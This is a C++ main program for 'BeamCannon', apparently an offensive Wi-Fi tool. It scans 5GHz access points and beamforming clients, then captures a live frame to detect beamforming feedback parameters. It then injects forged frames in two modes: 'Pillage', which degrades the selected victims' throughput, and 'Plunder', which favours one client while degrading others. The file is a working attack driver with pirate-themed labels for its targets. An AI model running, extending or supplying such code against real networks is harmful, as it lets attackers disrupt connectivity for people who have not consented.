#include "scanner.h"
#include "injector.h"
#include "display.h"
#include "logger.h"
#include "bfi.h"

#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <algorithm>
#include <atomic>
#include <thread>
#include <csignal>
#include <cstring>
#include <ctime>
#include <chrono>
#include <iomanip>

// ---------------------------------------------------------------------------
// Global state for signal handler
// ---------------------------------------------------------------------------
static Injector* g_injector = nullptr;

static void sigint_handler(int) {
    printf("\n\n[*] Standing down...\n");
    if (g_injector) g_injector->stop();
}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

static std::string make_log_path() {
    auto now = std::chrono::system_clock::now();
    std::time_t t = std::chrono::system_clock::to_time_t(now);
    std::tm tm_buf{};
    localtime_r(&t, &tm_buf);
    char buf[64];
    strftime(buf, sizeof(buf), "beamcannon_%Y%m%d_%H%M%S.log", &tm_buf);
    return std::string(buf);
}

static void print_usage(const char* prog) {
    printf("Usage: %s --iface <monitor_interface> [--log <logfile>]\n", prog);
    printf("  --iface   Monitor mode interface (e.g. wlan0mon)\n");
    printf("  --log     Log file path (default: beamcannon_<timestamp>.log)\n");
    printf("\nMust be run as root.\n");
}

static std::vector<int> parse_selection(const std::string& input, int max) {
    std::vector<int> result;
    std::istringstream ss(input);
    std::string token;
    while (std::getline(ss, token, ',')) {
        try {
            int v = std::stoi(token);
            if (v >= 1 && v <= max)
                result.push_back(v - 1); // convert to 0-indexed
        } catch (...) {}
    }
    return result;
}

// Wait for Enter or 'R' key
static char wait_key() {
    std::string line;
    std::getline(std::cin, line);
    if (line.empty()) return '\n';
    return (char)std::toupper(line[0]);
}

// ---------------------------------------------------------------------------
// Auto-detect BFI parameters by capturing one real frame from the target
// ---------------------------------------------------------------------------
static bool autodetect_params(const std::string& iface,
                                const APInfo& /*ap*/,
                                const std::vector<ClientInfo>& victims,
                                BFIParams& out_params) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(iface.c_str(), 65535, 1, 500, errbuf);
    if (!pcap) return false;

    // Build filter for any of the victim MACs
    std::ostringstream filter;
    filter << "type mgt and (";
    for (size_t i = 0; i < victims.size(); i++) {
        if (i) filter << " or ";
        filter << "wlan addr2 " << victims[i].mac;
    }
    filter << ")";

    struct bpf_program fp;
    if (pcap_compile(pcap, &fp, filter.str().c_str(), 0,
                     PCAP_NETMASK_UNKNOWN) == 0)
        pcap_setfilter(pcap, &fp);

    bool found = false;
    double t_end = [](){
        struct timeval tv; gettimeofday(&tv, NULL);
        return tv.tv_sec + tv.tv_usec/1e6;
    }() + 5.0; // 5 second timeout

    struct pcap_pkthdr* hdr;
    const uint8_t* pkt;

    while (!found) {
        struct timeval tv; gettimeofday(&tv, NULL);
        if (tv.tv_sec + tv.tv_usec/1e6 > t_end) break;

        int r = pcap_next_ex(pcap, &hdr, &pkt);
        if (r != 1) continue;

        uint16_t rt_len = pkt[2] | (pkt[3] << 8);
        if ((int)hdr->caplen < rt_len + 24) continue;

        const uint8_t* body     = pkt + rt_len + 24;
        int            body_len = (int)hdr->caplen - rt_len - 24 - 4;

        if (bfi_detect(body, body_len, out_params)) {
            found = true;
        }
    }

    pcap_close(pcap);
    return found;
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------
int main(int argc, char* argv[]) {
    std::string iface;
    std::string log_path;

    // Parse arguments
    for (int i = 1; i < argc; i++) {
        if (std::string(argv[i]) == "--iface" && i+1 < argc)
            iface = argv[++i];
        else if (std::string(argv[i]) == "--log" && i+1 < argc)
            log_path = argv[++i];
        else if (std::string(argv[i]) == "--help" ||
                 std::string(argv[i]) == "-h") {
            print_usage(argv[0]);
            return 0;
        }
    }

    if (iface.empty()) {
        print_usage(argv[0]);
        return 1;
    }

    if (log_path.empty())
        log_path = make_log_path();

    // -----------------------------------------------------------------------
    // Setup
    // -----------------------------------------------------------------------
    Display disp;
    disp.banner();

    Logger logger(log_path);
    logger.info("BeamCannon started iface=" + iface + " log=" + log_path);

    printf("[*] Interface : " COL_WHITE "%s" COL_RESET "\n", iface.c_str());
    printf("[*] Log file  : " COL_WHITE "%s" COL_RESET "\n\n", log_path.c_str());

    Scanner scanner(iface);

    // -----------------------------------------------------------------------
    // AP discovery
    // -----------------------------------------------------------------------
    printf("[*] Scanning for fleet (5GHz access points)...\n\n");
    std::vector<APInfo> aps = scanner.scan_aps();

    if (aps.empty()) {
        printf(COL_RED "[!] No 5GHz APs found. Ensure interface is in monitor "
               "mode and try again.\n" COL_RESET);
        return 1;
    }

    disp.print_ap_list(aps);

    int ap_idx = -1;
    while (ap_idx < 0) {
        printf("Select vessel [1-%zu]: ", aps.size());
        std::string input;
        std::getline(std::cin, input);
        try {
            int v = std::stoi(input);
            if (v >= 1 && v <= (int)aps.size())
                ap_idx = v - 1;
        } catch (...) {}
        if (ap_idx < 0)
            printf(COL_RED "[!] Invalid selection.\n" COL_RESET);
    }

    const APInfo& ap = aps[ap_idx];
    logger.info("AP selected ssid=" + ap.ssid +
                " bssid=" + ap.bssid +
                " ch=" + std::to_string(ap.channel) +
                " bw=" + std::to_string(ap.bw_mhz));

    printf("\n[*] Locking to CH%d %dMHz...\n", ap.channel, ap.bw_mhz);
    if (!scanner.lock_channel(ap.channel, ap.bw_mhz, ap.center_freq2)) {
        printf(COL_YELLOW "[!] Channel lock warning — continuing anyway.\n"
               COL_RESET);
    }

    // -----------------------------------------------------------------------
    // Client discovery
    // -----------------------------------------------------------------------
    std::vector<ClientInfo> clients;
    double sounding_ms = 500.0;

    auto do_client_scan = [&]() {
        printf("[*] Scanning for beamforming crew (500ms)...\n\n");
        clients = scanner.scan_clients(ap, 500, sounding_ms);
        disp.print_client_list(clients, sounding_ms);
        logger.info("Client scan complete found=" +
                    std::to_string(clients.size()) +
                    " sounding_ms=" + std::to_string((int)sounding_ms));
    };

    do_client_scan();

    char key = '\n';
    while (key == 'R' || key == 'r') {
        printf("[R] Refresh  [Enter] Continue: ");
        key = wait_key();
        if (key == 'R') do_client_scan();
    }

    if (clients.empty()) {
        printf(COL_RED "[!] No beamforming clients found. Ensure active "
               "download traffic is running on victim devices.\n" COL_RESET);
        return 1;
    }

    // -----------------------------------------------------------------------
    // Attack mode selection
    // -----------------------------------------------------------------------
    printf("Select mode:\n");
    printf("  [1] Pillage  - degrade victim throughput\n");
    printf("  [2] Plunder  - boost quartermaster, degrade marks\n\n");

    AttackMode mode = AttackMode::PILLAGE;
    while (true) {
        printf("Mode [1-2]: ");
        std::string input;
        std::getline(std::cin, input);
        if (input == "1") { mode = AttackMode::PILLAGE; break; }
        if (input == "2") { mode = AttackMode::PLUNDER; break; }
        printf(COL_RED "[!] Enter 1 or 2.\n" COL_RESET);
    }

    // -----------------------------------------------------------------------
    // Victim selection
    // -----------------------------------------------------------------------
    std::vector<ClientInfo> victims;
    ClientInfo quartermaster;
    bool has_qm = false;

    printf("\n");
    disp.print_client_list(clients, sounding_ms);

    while (victims.empty()) {
        printf("Select mark(s) [comma separated, e.g. 1,2]: ");
        std::string input;
        std::getline(std::cin, input);
        auto idxs = parse_selection(input, (int)clients.size());
        for (int idx : idxs)
            victims.push_back(clients[idx]);
        if (victims.empty())
            printf(COL_RED "[!] No valid selections.\n" COL_RESET);
    }

    if (mode == AttackMode::PLUNDER) {
        // Remove selected victims from available QM candidates
        std::vector<ClientInfo> remaining;
        for (const auto& c : clients) {
            bool is_victim = false;
            for (const auto& v : victims)
                if (v.mac == c.mac) { is_victim = true; break; }
            if (!is_victim) remaining.push_back(c);
        }

        if (remaining.empty()) {
            printf(COL_YELLOW "[!] No remaining clients for quartermaster. "
                   "Switching to pillage.\n" COL_RESET);
            mode = AttackMode::PILLAGE;
        } else {
            printf("\nAvailable quartermasters:\n");
            for (size_t i = 0; i < remaining.size(); i++)
                printf("  [%zu] %s\n", i+1, remaining[i].mac.c_str());

            int qm_idx = -1;
            while (qm_idx < 0) {
                printf("Select quartermaster [1-%zu]: ", remaining.size());
                std::string input;
                std::getline(std::cin, input);
                try {
                    int v = std::stoi(input);
                    if (v >= 1 && v <= (int)remaining.size())
                        qm_idx = v - 1;
                } catch (...) {}
                if (qm_idx < 0)
                    printf(COL_RED "[!] Invalid selection.\n" COL_RESET);
            }
            quartermaster = remaining[qm_idx];
            has_qm = true;
        }
    }

    // -----------------------------------------------------------------------
    // Auto-detect BFI parameters from a live frame
    // -----------------------------------------------------------------------
    printf("\n[*] Auto-detecting BFI parameters from live frame...\n");

    BFIParams params;
    if (!autodetect_params(iface, ap, victims, params)) {
        printf(COL_RED "[!] Could not capture a BFI frame within 5 seconds.\n"
               "    Ensure victim device is actively downloading.\n" COL_RESET);
        return 1;
    }

    printf("[+] Detected: %s\n", bfi_params_str(params).c_str());
    logger.info("BFI params detected: " + bfi_params_str(params));
    logger.start("iface=" + iface +
                 " ap=" + ap.bssid +
                 " ch=" + std::to_string(ap.channel) +
                 " bw=" + std::to_string(ap.bw_mhz) +
                 " standard=" + params_standard_str(params) +
                 " Nr=" + std::to_string(params.Nr) +
                 " Nc=" + std::to_string(params.Nc) +
                 " Nst=" + std::to_string(params.Nst));

    std::string mode_str;
    if (mode == AttackMode::PILLAGE) {
        mode_str = "pillage victims=";
        for (size_t i = 0; i < victims.size(); i++) {
            if (i) mode_str += ",";
            mode_str += victims[i].mac;
        }
    } else {
        mode_str = "plunder quartermaster=" + quartermaster.mac + " victims=";
        for (size_t i = 0; i < victims.size(); i++) {
            if (i) mode_str += ",";
            mode_str += victims[i].mac;
        }
    }
    logger.mode(mode_str);

    printf("\n[*] Opening fire in 1 second...\n");
    std::this_thread::sleep_for(std::chrono::seconds(1));

    // -----------------------------------------------------------------------
    // Attack
    // -----------------------------------------------------------------------
    signal(SIGINT, sigint_handler);

    Injector injector(iface, ap, logger);
    g_injector = &injector;

    auto t_attack_start = std::chrono::steady_clock::now();

    disp.draw_attack_frame(ap, mode, victims,
                            has_qm ? &quartermaster : nullptr,
                            log_path, sounding_ms);

    // Stats callback: called from injector thread after each broadside
    auto stats_cb = [&](const std::vector<InjectSample>& samples) {
        for (const auto& s : samples)
            disp.record_sample(s.victim_mac, s.compute_ms, s.success);

        long uptime = std::chrono::duration_cast<std::chrono::seconds>(
                          std::chrono::steady_clock::now() - t_attack_start)
                          .count();

        disp.update_attack_stats(injector.stats(), samples,
                                  sounding_ms, uptime);
    };

    // Run attack in a separate thread so the main thread can handle signals
    std::thread attack_thread([&]() {
        if (mode == AttackMode::PILLAGE) {
            injector.run_pillage(victims, params, stats_cb);
        } else {
            injector.run_plunder(victims, quartermaster, params, stats_cb);
        }
    });

    attack_thread.join();

    // -----------------------------------------------------------------------
    // Summary
    // -----------------------------------------------------------------------
    long total_s = std::chrono::duration_cast<std::chrono::seconds>(
                       std::chrono::steady_clock::now() - t_attack_start)
                       .count();

    auto& st = injector.stats();
    // Compute overall average compute time from the display's rolling windows
    // (approximate: use last known values)
    logger.log_summary(st.total_broadsides.load(),
                        st.success_count.load(),
                        st.fail_count.load(),
                        0.0,   // avg compute — logged per-injection already
                        sounding_ms,
                        total_s);

    printf("\n\n" COL_BOLD "[ Mission complete ]\n" COL_RESET);
    printf("Broadsides : %d\n", st.total_broadsides.load());
    printf("Success    : " COL_GREEN "%d" COL_RESET "\n", st.success_count.load());
    printf("Miss       : " COL_RED "%d" COL_RESET "\n", st.fail_count.load());
    printf("Log        : %s\n\n", log_path.c_str());

    return 0;
}


